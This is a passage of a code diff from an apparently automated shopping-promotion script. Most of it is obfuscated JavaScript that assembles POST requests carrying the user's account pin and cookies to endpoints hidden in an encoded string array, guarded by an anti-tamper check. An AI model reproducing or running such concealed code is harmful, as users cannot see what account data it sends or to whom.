`${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x8]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x12]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0xc]}`;_0xcd07x4= `${__Oxe7d5a[0xd]}${$[__Oxe7d5a[0xe]]}${__Oxe7d5a[0xf]}${$[__Oxe7d5a[0x10]]}${__Oxe7d5a[0x11]}`;break;case __Oxe7d5a[0x1c]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x13]}`;let _0xcd07x7=`${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x14]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x15]}${$[__Oxe7d5a[0x16]]}${__Oxe7d5a[0x2]}`;_0xcd07x4= `${__Oxe7d5a[0x17]}${$[__Oxe7d5a[0xe]]}${__Oxe7d5a[0x18]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x19]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x1a]}${encodeURIComponent(_0xcd07x7)}${__Oxe7d5a[0x1b]}`;break;case __Oxe7d5a[0x1f]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x1d]}`;_0xcd07x4= `${__Oxe7d5a[0x1e]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x25]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x20]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x22]}${encodeURIComponent($[__Oxe7d5a[0x23]])}${__Oxe7d5a[0x24]}${$[__Oxe7d5a[0x16]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x2a]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x26]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x27]}${$[__Oxe7d5a[0x29]][__Oxe7d5a[0x28]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x2d]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x2b]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x2c]}${$[__Oxe7d5a[0xe]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x2f]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x2e]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x34]:url= `${__Oxe7d5a[0x2]}${_0xcd07x3}${__Oxe7d5a[0x30]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x31]}${$[__Oxe7d5a[0x32]]}${__Oxe7d5a[0x33]}`;break;case __Oxe7d5a[0x3a]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x35]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x36]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x37]}${$[__Oxe7d5a[0xe]]}${__Oxe7d5a[0x38]}${$[__Oxe7d5a[0x39]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x5]:;case __Oxe7d5a[0x3f]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x3b]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x3c]}${encodeURIComponent(JSON[__Oxe7d5a[0x3e]]($[__Oxe7d5a[0x3d]]))}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x41]:url= `${__Oxe7d5a[0x2]}${_0xcd07x3}${__Oxe7d5a[0x40]}${_0xcd07x2}${__Oxe7d5a[0x2]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x2]}`;if(_0xcd07x2== __Oxe7d5a[0x41]){_0xcd07x4+= `${__Oxe7d5a[0x42]}${$[__Oxe7d5a[0x43]]}${__Oxe7d5a[0x2]}`};break;case __Oxe7d5a[0x44]:;case __Oxe7d5a[0x45]:if(_0xcd07x2== __Oxe7d5a[0x45]){url= `${__Oxe7d5a[0x2]}${_0xcd07x3}${__Oxe7d5a[0x46]}`}else {url= `${__Oxe7d5a[0x2]}${_0xcd07x3}${__Oxe7d5a[0x47]}`};_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x48]}${$[__Oxe7d5a[0x49]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x4d]:url= `${__Oxe7d5a[0x7]}${_0xcd07x3}${__Oxe7d5a[0x4a]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x4b]}${$[__Oxe7d5a[0x4c]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x54]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x4e]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x4f]}${$[__Oxe7d5a[0x29]][__Oxe7d5a[0x50]]}${__Oxe7d5a[0x51]}${$[__Oxe7d5a[0x53]][__Oxe7d5a[0x52]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x56]:url= `${__Oxe7d5a[0x2]}${_0xcd07x3}${__Oxe7d5a[0x55]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x31]}${$[__Oxe7d5a[0x32]]}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x58]:url= `${__Oxe7d5a[0x2]}${_0xcd07x3}${__Oxe7d5a[0x57]}`;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x5a]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x59]}`;;;_0xcd07x4= `${__Oxe7d5a[0x9]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x6f]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x5b]}`;_0xcd07x4= `${__Oxe7d5a[0x17]}${$[__Oxe7d5a[0xe]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x5c]}${$[__Oxe7d5a[0x39]]}${__Oxe7d5a[0x19]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x5d]}${encodeURIComponent($[__Oxe7d5a[0x5e]])}${__Oxe7d5a[0x5f]}${encodeURIComponent($[__Oxe7d5a[0x60]])}${__Oxe7d5a[0x61]}${$[__Oxe7d5a[0x62]]}${__Oxe7d5a[0x63]}${encodeURIComponent($[__Oxe7d5a[0x64]])}${__Oxe7d5a[0x65]}${encodeURIComponent($[__Oxe7d5a[0x66]])}${__Oxe7d5a[0x67]}${encodeURIComponent($[__Oxe7d5a[0x68]])}${__Oxe7d5a[0x69]}${$[__Oxe7d5a[0x6a]]}${__Oxe7d5a[0x6b]}${$[__Oxe7d5a[0x6c]]}${__Oxe7d5a[0x6d]}${encodeURIComponent($[__Oxe7d5a[0x6e]])}${__Oxe7d5a[0x2]}`;break;case __Oxe7d5a[0x73]:url= `${__Oxe7d5a[0x7]}${$[__Oxe7d5a[0x1]]}${__Oxe7d5a[0x5b]}`;_0xcd07x4= `${__Oxe7d5a[0x17]}${$[__Oxe7d5a[0xe]]}${__Oxe7d5a[0x21]}${encodeURIComponent($.Pin)}${__Oxe7d5a[0x5c]}${$[__Oxe7d5a[0x39]]}${__Oxe7d5a[0x19]}${$[__Oxe7d5a[0xa]]}${__Oxe7d5a[0x5d]}${encodeURIComponent($[__Oxe7d5a[0x5e]])}${__Oxe7d5a[0x5f]}${encodeURIComponent($[__Oxe7d5a[0x60]])}${__Oxe7d5a[0x61]}${$[__Oxe7d5a[0x62]]}${__Oxe7d5a[0x63]}${encodeURIComponent($[__Oxe7d5a[0x64]])}${__Oxe7d5a[0x65]}${encodeURIComponent($[__Oxe7d5a[0x66]])}${__Oxe7d5a[0x67]}${encodeURIComponent($[__Oxe7d5a[0x68]])}${__Oxe7d5a[0x70]}${$[__Oxe7d5a[0x71]]}${__Oxe7d5a[0x72]}${$[__Oxe7d5a[0x6a]]}${__Oxe7d5a[0x6b]}${$[__Oxe7d5a[0x6c]]}${__Oxe7d5a[0x6d]}${encodeURIComponent($[__Oxe7d5a[0x6e]])}${__Oxe7d5a[0x2]}`;break;default:console[__Oxe7d5a[0x75]](`${__Oxe7d5a[0x74]}${_0xcd07x2}${__Oxe7d5a[0x2]}`)};let _0xcd07x8=getPostRequest(url,_0xcd07x4,_0xcd07x5);return  new Promise(async (_0xcd07x9)=>{$[__Oxe7d5a[0x7b]](_0xcd07x8,(_0xcd07xa,_0xcd07xb,_0xcd07xc)=>{try{setActivityCookie(_0xcd07xb);if(_0xcd07xa){if(_0xcd07xb&&  typeof _0xcd07xb[__Oxe7d5a[0x76]]!= __Oxe7d5a[0x77]){if(_0xcd07xb[__Oxe7d5a[0x76]]== 493){console[__Oxe7d5a[0x75]](__Oxe7d5a[0x78]);$[__Oxe7d5a[0x0]]= true}};console[__Oxe7d5a[0x75]](`${__Oxe7d5a[0x2]}${$[__Oxe7d5a[0x79]](_0xcd07xa,_0xcd07xa)}${__Oxe7d5a[0x2]}`);console[__Oxe7d5a[0x75]](`${__Oxe7d5a[0x2]}${_0xcd07x2}${__Oxe7d5a[0x7a]}`)}else {dealReturn(_0xcd07x2,_0xcd07xc)}}catch(e){console[__Oxe7d5a[0x75]](e,_0xcd07xb)}finally{_0xcd07x9()}})})}(function(_0xcd07xd,_0xcd07xe,_0xcd07xf,_0xcd07x10,_0xcd07x11,_0xcd07x12){_0xcd07x12= __Oxe7d5a[0x77];_0xcd07x10= function(_0xcd07x13){if( typeof alert!== _0xcd07x12){alert(_0xcd07x13)};if( typeof console!== _0xcd07x12){console[__Oxe7d5a[0x75]](_0xcd07x13)}};_0xcd07xf= function(_0xcd07x14,_0xcd07xd){return _0xcd07x14+ _0xcd07xd};_0xcd07x11= _0xcd07xf(__Oxe7d5a[0x7c],_0xcd07xf(_0xcd07xf(__Oxe7d5a[0x7d],__Oxe7d5a[0x7e]),__Oxe7d5a[0x7f]));try{_0xcd07xd= __encode;if(!( typeof _0xcd07xd!== _0xcd07x12&& _0xcd07xd=== _0xcd07xf(__Oxe7d5a[0x80],__Oxe7d5a[0x81]))){_0xcd07x10(_0xcd07x11)}}catch(e){_0xcd07x10(_0xcd07x11)}})({})
 
 async function opencard() {
     try {
@@ -824,7 +652,7 @@ async function dealReturn(type, data) {
                 if (typeof res == 'object') {
                     if (res.result && res.result === true) {
                         console.log(`地址填写成功！`)
-                        $.message += `获得实物奖励，地址填写成功：${$.fullAddress}\n`
+                        $.message += `填写成功\n`
                     } else {
                         console.log(`${type} ${data}`)
                     }
